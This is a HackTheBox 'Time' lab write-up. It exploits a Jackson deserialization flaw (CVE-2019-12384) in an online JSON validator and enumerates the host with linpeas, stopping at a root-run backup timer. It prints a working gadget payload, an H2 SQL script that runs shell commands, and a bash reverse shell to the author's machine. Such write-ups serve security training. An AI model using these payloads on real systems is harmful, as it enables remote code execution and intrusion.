## Time | HackTheBox

### 1. Scan
```bash
kali@kali:~/Desktop/htb/time$ sudo nmap -A -p- 10.10.10.214
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-30 06:43 EDT
Nmap scan report for 10.10.10.214
Host is up (0.34s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Online JSON parser
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=10/30%OT=22%CT=1%CU=31803%PV=Y%DS=2%DC=T%G=Y%TM=5F9BFD
OS:38%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A)OP
OS:S(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST
OS:11NW7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)EC
OS:N(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
OS:D=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 110/tcp)
HOP RTT       ADDRESS
1   338.07 ms 10.10.14.1
2   338.28 ms 10.10.10.214

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 3787.62 seconds
```
This is an Ubuntu machine running SSH and Apache.

### 2. Enumerate
Navigating to the webpage shows an online JSON beautifier and validator tool. The tool has two modes for each of these functionalities. The beautifier functionality works as expected, returning a nicely formatted JSON set of data. The validator gives an error:
```
Validation failed: Unhandled Java exception: com.fasterxml.jackson.databind.exc.MismatchedInputException: Unexpected token (START_OBJECT), expected VALUE_STRING: need JSON String that contains type id (for subtype of java.lang.Object)
```
I can't find much clear information on what this error means, however it seems to be something to do with Java's Jackson library and an expected structure that I'm not getting right. While there are vulnerable versions of Fasterxml Jackson-databind, I was unable to find a way to figure out exactly what version was being used on the server. From looking at https://www.cvedetails.com/vulnerability-list/vendor_id-15866/product_id-42991/Fasterxml-Jackson-databind.html, there were two vulnerabilities identified that can lead to remote code execution, so those got prioritized when I was checking each one.

### 3. Get a shell
When researching CVE-2019-12384 I found the following page: https://blog.doyensec.com/2019/07/22/jackson-gadgets.html and a github repo https://github.com/jas502n/CVE-2019-12384. As this was one of the more-decently documented exploits I had a go at modifying it to work for this case. In my first attempt that yielded results, I used the payload:
```json
["ch.qos.logback.core.db.DriverManagerConnectionSource",{"url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://10.10.15.158:8000/inject.sql'"}]
```
With inject.sql containing:
```sql
CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
        String[] command = {"bash", "-c", cmd};
        java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter("\\A");
        return s.hasNext() ? s.next() : "";  }
$$;
CALL SHELLEXEC(<command here>)
```
Basically the payload loads an object, which when deserialized, forces the machine to retrieve and run a script which will execute a command.  
For a test I can ping my machine:
```sql
CALL SHELLEXEC("ping -c 5 10.10.15.158")
```
And listen on tun0 with tcpdump:
```
kali@kali:~$ sudo tcpdump -i tun0
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
...
05:34:08.875271 IP 10.10.15.158.52114 > 10.10.10.214.http: Flags [.], ack 1, win 502, options [nop,nop,TS val 1746003165 ecr 569643486], length 0
05:34:09.214065 IP 10.10.10.214.http > 10.10.15.158.52114: Flags [.], ack 641, win 505, options [nop,nop,TS val 569653987 ecr 1745981881], length 0
05:34:12.955222 IP 10.10.10.214 > 10.10.15.158: ICMP echo request, id 1, seq 1, length 64
05:34:12.960306 IP 10.10.15.158 > 10.10.10.214: ICMP echo reply, id 1, seq 1, length 64
05:34:14.139807 IP 10.10.10.214 > 10.10.15.158: ICMP echo request, id 1, seq 2, length 64
05:34:14.139881 IP 10.10.15.158 > 10.10.10.214: ICMP echo reply, id 1, seq 2, length 64
05:34:15.140590 IP 10.10.10.214 > 10.10.15.158: ICMP echo request, id 1, seq 3, length 64
05:34:15.140630 IP 10.10.15.158 > 10.10.10.214: ICMP echo reply, id 1, seq 3, length 64
05:34:16.245345 IP 10.10.10.214 > 10.10.15.158: ICMP echo request, id 1, seq 4, length 64
05:34:16.245397 IP 10.10.15.158 > 10.10.10.214: ICMP echo reply, id 1, seq 4, length 64
05:34:17.247004 IP 10.10.10.214 > 10.10.15.158: ICMP echo request, id 1, seq 5, length 64
05:34:17.247055 IP 10.10.15.158 > 10.10.10.214: ICMP echo reply, id 1, seq 5, length 64
...
```
With this I can confirm command execution. Next, spawn a bash reverse shell:
```bash
CALL SHELLEXEC('bash -i &> /dev/tcp/10.10.15.158/9999 0>&1')
```
I recieve the shell in my listener.
```bash
kali@kali:~$ nc -lvnp 9999
Listening on 0.0.0.0 9999
Connection received on 10.10.10.214 37738
bash: cannot set terminal process group (846): Inappropriate ioctl for device
bash: no job control in this shell
pericles@time:/var/www/html$ whoami
pericles
```

### 4. Enumerate from user
Checking out the folder we landed in:
```bash
pericles@time:/var/www/html$ ls
css
fonts
images
index.php
js
vendor
pericles@time:/var/www/html$ cat index.php
cat index.php
<?php
if(isset($_POST['data'])){
        if(isset($_POST['mode']) && $_POST['mode'] === "2"){
                $filename = tempnam("/dev/shm", "payload");
                $myfile = fopen($filename, "w") or die("Unable to open file!");
                $txt = $_POST['data'];
                fwrite($myfile, $txt);
                fclose($myfile);
                exec("/usr/bin/jruby /opt/json_project/parse.rb $filename 2>&1", $cmdout, $ret);
                unlink($filename);
                if($ret === 0){
                        $output = '<pre>Validation successful!</pre>';
                }
                else{
                        $output = '<pre>Validation failed: ' . $cmdout[1] . '</pre>';
                }
        }
        else{
                $json_ugly = $_POST['data'];
                $json_pretty = json_encode(json_decode($json_ugly), JSON_PRETTY_PRINT);
                $output = '<pre>'.$json_pretty.'</pre>';
        }
                                                                                                                                                                                                    
}                                                                                                                                                                                                   
?>                                                                                                                                                                                                  
<!DOCTYPE html>                                                                                                                                                                                     
<html lang="en">
```
Nothing else interesting here. Seeing if there's any other users:
```bash
pericles@time:/var/www/html$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
pericles:x:1000:1000:Pericles:/home/pericles:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:112:118:MySQL Server,,,:/nonexistent:/bin/false
```
This user is the only one with a shell (aside from root), but there are lots of other service accounts.
Checking out the distribution:
```bash
pericles@time:/var/www/html$ cat /etc/*-release
cat /etc/*-release
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=20.04
DISTRIB_CODENAME=focal
DISTRIB_DESCRIPTION="Ubuntu 20.04 LTS"
NAME="Ubuntu"
VERSION="20.04 LTS (Focal Fossa)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 20.04 LTS"
VERSION_ID="20.04"
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
VERSION_CODENAME=focal
UBUNTU_CODENAME=focal
```
Home folder:
```bash
pericles@time:/home$ ls -laR pericles
pericles:
total 44
drwxr-xr-x 7 pericles pericles 4096 Oct 23 09:45 .
drwxr-xr-x 3 root     root     4096 Oct  2 13:45 ..
lrwxrwxrwx 1 root     root        9 Oct  1 15:05 .bash_history -> /dev/null
-rw-r--r-- 1 pericles pericles  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 pericles pericles 3771 Feb 25  2020 .bashrc
drwx------ 2 pericles pericles 4096 Sep 20 13:53 .cache
drwx------ 3 pericles pericles 4096 Oct 22 17:45 .config
drwx------ 2 pericles pericles 4096 Oct 23 06:53 .gnupg
lrwxrwxrwx 1 root     root        9 Oct  1 15:07 .lhistory -> /dev/null
drwxrwxr-x 3 pericles pericles 4096 Sep 29 12:52 .local
-rw-r--r-- 1 pericles pericles  807 Feb 25  2020 .profile
drwxr-xr-x 3 pericles pericles 4096 Oct  2 13:20 snap
-r-------- 1 pericles pericles   33 Nov 16 21:31 user.txt

pericles/.cache:
total 8
drwx------ 2 pericles pericles 4096 Sep 20 13:53 .
drwxr-xr-x 7 pericles pericles 4096 Oct 23 09:45 ..
-rw-r--r-- 1 pericles pericles    0 Sep 20 13:53 motd.legal-displayed

pericles/.config:
total 12
drwx------ 3 pericles pericles 4096 Oct 22 17:45 .
drwxr-xr-x 7 pericles pericles 4096 Oct 23 09:45 ..
drwx------ 2 pericles pericles 4096 Oct 22 17:45 procps

pericles/.config/procps:
total 8
drwx------ 2 pericles pericles 4096 Oct 22 17:45 .
drwx------ 3 pericles pericles 4096 Oct 22 17:45 ..

pericles/.gnupg:
total 16
drwx------ 2 pericles pericles 4096 Oct 23 06:53 .
drwxr-xr-x 7 pericles pericles 4096 Oct 23 09:45 ..
-rw------- 1 pericles pericles   32 Oct  2 13:20 pubring.kbx
-rw------- 1 pericles pericles 1200 Oct  2 13:20 trustdb.gpg

pericles/.local:
total 12
drwxrwxr-x 3 pericles pericles 4096 Sep 29 12:52 .
drwxr-xr-x 7 pericles pericles 4096 Oct 23 09:45 ..
drwx------ 3 pericles pericles 4096 Sep 29 12:52 share

pericles/.local/share:
total 12
drwx------ 3 pericles pericles 4096 Sep 29 12:52 .
drwxrwxr-x 3 pericles pericles 4096 Sep 29 12:52 ..
drwx------ 2 pericles pericles 4096 Sep 29 12:52 nano

pericles/.local/share/nano:
total 8
drwx------ 2 pericles pericles 4096 Sep 29 12:52 .
drwx------ 3 pericles pericles 4096 Sep 29 12:52 ..

pericles/snap:
total 12
drwxr-xr-x 3 pericles pericles 4096 Oct  2 13:20 .
drwxr-xr-x 7 pericles pericles 4096 Oct 23 09:45 ..
drwxr-xr-x 5 pericles pericles 4096 Oct 23 06:52 lxd

pericles/snap/lxd:
total 20
drwxr-xr-x 5 pericles pericles 4096 Oct 23 06:52 .
drwxr-xr-x 3 pericles pericles 4096 Oct  2 13:20 ..
drwxr-xr-x 3 pericles pericles 4096 Oct  2 13:20 17886
drwxr-xr-x 3 pericles pericles 4096 Oct  2 13:20 17936
drwxr-xr-x 2 pericles pericles 4096 Oct  2 13:20 common
lrwxrwxrwx 1 pericles pericles    5 Oct 23 06:52 current -> 17936

pericles/snap/lxd/17886:
total 12
drwxr-xr-x 3 pericles pericles 4096 Oct  2 13:20 .
drwxr-xr-x 5 pericles pericles 4096 Oct 23 06:52 ..
drwxr-xr-x 3 pericles pericles 4096 Oct  2 13:20 .config

pericles/snap/lxd/17886/.config:
total 12
drwxr-xr-x 3 pericles pericles 4096 Oct  2 13:20 .
drwxr-xr-x 3 pericles pericles 4096 Oct  2 13:20 ..
drwxr-x--- 2 pericles pericles 4096 Oct  2 13:20 lxc

pericles/snap/lxd/17886/.config/lxc:
total 12
drwxr-x--- 2 pericles pericles 4096 Oct  2 13:20 .
drwxr-xr-x 3 pericles pericles 4096 Oct  2 13:20 ..
-rw-r--r-- 1 pericles pericles  188 Oct  2 13:20 config.yml

pericles/snap/lxd/17936:
total 12
drwxr-xr-x 3 pericles pericles 4096 Oct  2 13:20 .
drwxr-xr-x 5 pericles pericles 4096 Oct 23 06:52 ..
drwxr-xr-x 3 pericles pericles 4096 Oct  2 13:20 .config

pericles/snap/lxd/17936/.config:
total 12
drwxr-xr-x 3 pericles pericles 4096 Oct  2 13:20 .
drwxr-xr-x 3 pericles pericles 4096 Oct  2 13:20 ..
drwxr-x--- 2 pericles pericles 4096 Oct  2 13:20 lxc

pericles/snap/lxd/17936/.config/lxc:
total 12
drwxr-x--- 2 pericles pericles 4096 Oct  2 13:20 .
drwxr-xr-x 3 pericles pericles 4096 Oct  2 13:20 ..
-rw-r--r-- 1 pericles pericles  188 Oct  2 13:20 config.yml

pericles/snap/lxd/common:
total 8
drwxr-xr-x 2 pericles pericles 4096 Oct  2 13:20 .
drwxr-xr-x 5 pericles pericles 4096 Oct 23 06:52 ..
```
Not much going on in here. Running processes:
```bash
pericles@time:/var/www/html$ ps -aux
ps -aux
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.1  0.2 169652 11540 ?        Ss   Nov16   0:29 /sbin/init auto automatic-ubiquity noprompt
...
systemd+     654  0.0  0.3  24044 12188 ?        Ss   Nov16   0:02 /lib/systemd/systemd-resolved
systemd+     655  0.0  0.1  90388  6396 ?        Ssl  Nov16   0:02 /lib/systemd/systemd-timesyncd
root         671  0.0  0.2  47664 10468 ?        Ss   Nov16   0:00 /usr/bin/VGAuthService
root         693  0.0  0.1 161976  7788 ?        S<sl Nov16   0:18 /usr/bin/vmtoolsd
root         787  0.0  0.1 235644  7396 ?        Ssl  Nov16   0:02 /usr/lib/accountsservice/accounts-daemon
root         800  0.0  0.0   6812  3060 ?        Ss   Nov16   0:00 /usr/sbin/cron -f
message+     801  0.0  0.1   7532  4616 ?        Ss   Nov16   0:04 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
root         817  0.0  0.0  81944  3748 ?        Ssl  Nov16   0:00 /usr/sbin/irqbalance --foreground
root         818  0.0  0.4  29016 18184 ?        Ss   Nov16   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
syslog       820  0.1  0.1 224324  5380 ?        Ssl  Nov16   0:26 /usr/sbin/rsyslogd -n -iNONE
root         832  0.2  0.8 928956 32800 ?        Ssl  Nov16   0:49 /usr/lib/snapd/snapd
root         842  0.0  0.1  16724  7672 ?        Ss   Nov16   0:02 /lib/systemd/systemd-logind
root         852  0.0  0.4 194032 18924 ?        Ss   Nov16   0:00 /usr/sbin/apache2 -k start
daemon       853  0.0  0.0   3792  2292 ?        Ss   Nov16   0:00 /usr/sbin/atd -f
root         858  0.0  0.1  12160  7280 ?        Ss   Nov16   0:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
root         903  0.0  0.5 107868 20904 ?        Ssl  Nov16   0:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
root         908  0.0  0.0   5828  1764 tty1     Ss+  Nov16   0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
root         909  0.0  0.1 232700  6936 ?        Ssl  Nov16   0:00 /usr/lib/policykit-1/polkitd --no-debug
pericles     970  0.0  0.3 194824 15044 ?        S    Nov16   0:00 /usr/sbin/apache2 -k start
pericles    4197  0.0  0.0   2608   544 ?        S    Nov16   0:00 sh -c /usr/bin/jruby /opt/json_project/parse.rb /dev/shm/payloadPvpyaw 2>&1
pericles    4198  0.1  5.2 3607048 210084 ?      Sl   Nov16   0:29 java -Xss2048k -Djffi.boot.library.path=/usr/share/jruby/lib/jni -Djava.security.egd=file:/dev/urandom -Xbootclasspath/a:/usr/share/jruby/lib/jruby.jar -classpath : -Djruby.home=/usr/share/jruby -Djruby.lib=/usr/share/jruby/lib -Djruby.script=jruby -Djruby.shell=/bin/sh -Ddebian.include.mri_vendor_libdir_in_load_path=true org.jruby.Main /opt/json_project/parse.rb /dev/shm/payloadPvpyaw
pericles    4236  0.0  0.0   3976  2864 ?        S    Nov16   0:00 bash -c bash -i >& /dev/tcp/10.10.14.254/2586 0>&1
pericles    4237  0.0  0.1   5172  4552 ?        S    Nov16   0:00 bash -i
root       10346  0.0  0.0      0     0 ?        I<   Nov16   0:00 [xfsalloc]
root       10347  0.0  0.0      0     0 ?        I<   Nov16   0:00 [xfs_mru_cache]
...
root       62183  0.0  0.0      0     0 ?        I    03:11   0:00 [kworker/0:0-events]
root       63902  0.0  0.0      0     0 ?        I    03:21   0:00 [kworker/u256:3-events_power_efficient]
root       65020  0.0  0.0      0     0 ?        I    03:28   0:00 [kworker/u256:0-events_power_efficient]
pericles   65478  0.0  0.0   2608   608 ?        S    03:30   0:00 sh -c /usr/bin/jruby /opt/json_project/parse.rb /dev/shm/payloadC9wu7O 2>&1
pericles   65479  2.0  5.0 3604996 201480 ?      Sl   03:30   0:09 java -Xss2048k -Djffi.boot.library.path=/usr/share/jruby/lib/jni -Djava.security.egd=file:/dev/urandom -Xbootclasspath/a:/usr/share/jruby/lib/jruby.jar -classpath : -Djruby.home=/usr/share/jruby -Djruby.lib=/usr/share/jruby/lib -Djruby.script=jruby -Djruby.shell=/bin/sh -Ddebian.include.mri_vendor_libdir_in_load_path=true org.jruby.Main /opt/json_project/parse.rb /dev/shm/payloadC9wu7O
pericles   65540  0.0  0.0   3976  2888 ?        S    03:30   0:00 bash -c bash -i &>/dev/tcp/10.10.15.158/9999 0>&1
pericles   65541  0.0  0.1   5172  4508 ?        S    03:30   0:00 bash -i
root       65942  0.0  0.0      0     0 ?        I    03:32   0:00 [kworker/1:1-cgroup_destroy]
root       66003  0.0  0.0      0     0 ?        I    03:32   0:00 [kworker/0:1-events]
root       66583  0.0  0.0      0     0 ?        I    03:36   0:00 [kworker/u256:1-events_power_efficient]
root       66890  0.0  0.0      0     0 ?        I    03:37   0:00 [kworker/0:3-events]
pericles   66920  0.0  0.0   6052  3120 ?        R    03:38   0:00 ps -aux
```
Here I can see some processes related to how the java backend of the JSON parsing application.
Loaded and ran linpeas:
```bash
pericles@time:/tmp/.asd$ wget http://10.10.15.158:8000/linpeas.sh
--2020-11-17 03:46:24--  http://10.10.15.158:8000/linpeas.sh
Connecting to 10.10.15.158:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 297851 (291K) [text/x-sh]
Saving to: 'linpeas.sh'

     0K .......... .......... .......... .......... .......... 17% 48.1K 5s
    50K .......... .......... .......... .......... .......... 34%  167K 3s
   100K .......... .......... .......... .......... .......... 51%  188K 2s
   150K .......... .......... .......... .......... .......... 68%  187K 1s
   200K .......... .......... .......... .......... .......... 85%  179K 0s
   250K .......... .......... .......... ..........           100%  178K=2.4s

2020-11-17 03:46:27 (122 KB/s) - 'linpeas.sh' saved [297851/297851]

pericles@time:/tmp/.asd$ chmod +x linpeas.sh
pericles@time:/tmp/.asd$ ./linpeas.sh
 Starting linpeas. Caching Writable Folders...

                     ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄▄
      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄
  ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄
  ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
  ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
  ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
  ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
  ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
  ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
  ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
  ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
  ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
  ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
  ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
  ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
  ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
  ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
  ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
  ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
   ▄▄▄▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄
        ▄▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄ 
             ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
    linpeas v2.9.1 by carlospolop
                                                                                                                                                                                                    
ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own networks and/or with the network owner's permission.                                                                                                                
                                                                                                                                                                                                    
Linux Privesc Checklist: https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist
 LEGEND:                                                                                                                                                                                            
  RED/YELLOW: 95% a PE vector
  RED: You must take a look at it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
  LightMangeta: Your username


====================================( Basic information )=====================================
OS: Linux version 5.4.0-52-generic (buildd@lgw01-amd64-060) (gcc version 9.3.0 (Ubuntu 9.3.0-17ubuntu1~20.04)) #57-Ubuntu SMP Thu Oct 15 10:57:00 UTC 2020                                          
User & Groups: uid=1000(pericles) gid=1000(pericles) groups=1000(pericles)
Hostname: time
Writable folder: /dev/shm
[+] /usr/bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)
[+] /usr/bin/nc is available for network discover & port scanning (linpeas can discover hosts and scan ports, learn more with -h)                                                                   
                                                                                                                                                                                                    

Caching directories . . . . . . . . . . . . . . . . . . . . . . . DONE
====================================( System Information )====================================                                                                                                      
[+] Operative system                                                                                                                                                                                
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#kernel-exploits                                                                                                                     
Linux version 5.4.0-52-generic (buildd@lgw01-amd64-060) (gcc version 9.3.0 (Ubuntu 9.3.0-17ubuntu1~20.04)) #57-Ubuntu SMP Thu Oct 15 10:57:00 UTC 2020                                              
Distributor ID: Ubuntu
Description:    Ubuntu 20.04 LTS
Release:        20.04
Codename:       focal

[+] Sudo version
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version                                                                                                                        
Sudo version 1.8.31
...
[+] .sh files in path
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#script-binaries-in-path                                                                                                             
/usr/bin/gettext.sh                                                                                                                                                                                 
You own the script: /usr/bin/timer_backup.sh
/usr/bin/rescan-scsi-bus.sh

[+] Unexpected folders in root
/lost+found                                                                                                                                                                                         

[+] Files (scripts) in /etc/profile.d/
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#profiles-files                                                                                                                      
total 36                                                                                                                                                                                            
drwxr-xr-x   2 root root 4096 Oct 22 17:02 .
drwxr-xr-x 102 root root 4096 Oct 23 06:44 ..
-rw-r--r--   1 root root   96 Dec  5  2019 01-locale-fix.sh
-rw-r--r--   1 root root 1557 Feb 17  2020 Z97-byobu.sh
-rw-r--r--   1 root root  825 Apr 10  2020 apps-bin-path.sh
-rw-r--r--   1 root root  729 Feb  2  2020 bash_completion.sh
-rw-r--r--   1 root root 1003 Aug 13  2019 cedilla-portuguese.sh
-rw-r--r--   1 root root 1107 Nov  3  2019 gawk.csh
-rw-r--r--   1 root root  757 Nov  3  2019 gawk.sh
...
```
Here we can see a script that is owned by this user: `timer_backup.sh`.  
Checking it out:
```bash
pericles@time:/tmp/.asd$ cat /usr/bin/timer_backup.sh
#!/bin/bash
zip -r website.bak.zip /var/www/html && mv website.bak.zip /root/backup.zip
```
Doing a search for this file throughout the linpeas output shows this is most likely the means we need to use to privesc. There appears to be a systemd timer set for the script:
```bash
-rw-r--r-- 1 root root 214 Oct 23 06:46 /etc/systemd/system/timer_backup.timer
-rw-r--r-- 1 root root 159 Oct 23 05:59 /etc/systemd/system/timer_backup.service
```
Some research () into systemd timers reveal the following:
*.Timers are systemd unit files whose name ends in .timer that control .service files or events. Timers can be used as an alternative to cron (read #As a cron replacement). Timers have built-in support for calendar time events, monotonic time events, and can be run asynchronously..*
  
It can be seen under system timers as well.
```bash
[+] System timers
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#timers                                                                                                                              
NEXT                        LEFT          LAST                        PASSED       UNIT                         ACTIVATES                                                                           
Tue 2020-11-17 03:47:11 UTC 5s left       n/a                         n/a          timer_backup.timer           timer_backup.service          
Tue 2020-11-17 04:09:00 UTC 21min left    Tue 2020-11-17 03:39:01 UTC 8min ago     phpsessionclean.timer        phpsessionclean.service       
Tue 2020-11-17 06:06:26 UTC 2h 19min left Mon 2020-11-16 22:14:21 UTC 5h 32min ago apt-daily-upgrade.timer      apt-daily-upgrade.service     
Tue 2020-11-17 11:24:54 UTC 7h left       Tue 2020-11-17 02:22:37 UTC 1h 24min ago apt-daily.timer              apt-daily.service             
Tue 2020-11-17 12:06:28 UTC 8h left       Tue 2020-11-17 00:10:21 UTC 3h 36min ago fwupd-refresh.timer          fwupd-refresh.service         
Tue 2020-11-17 14:15:39 UTC 10h left      Tue 2020-11-17 00:55:51 UTC 2h 51min ago motd-news.timer              motd-news.service             
Tue 2020-11-17 21:46:09 UTC 17h left      Mon 2020-11-16 21:46:09 UTC 6h ago       systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
Wed 2020-11-18 00:00:00 UTC 20h left      Tue 2020-11-17 00:00:01 UTC 3h 47min ago logrotate.timer              logrotate.service             
Wed 2020-11-18 00:00:00 UTC 20h left      Tue 2020-11-17 00:00:01 UTC 3h 47min ago man-db.timer                 man-db.service                
Sun 2020-11-22 03:10:57 UTC 4 days left   Mon 2020-11-16 21:31:19 UTC 6h ago       e2scrub_all.timer            e2scrub_all.service           
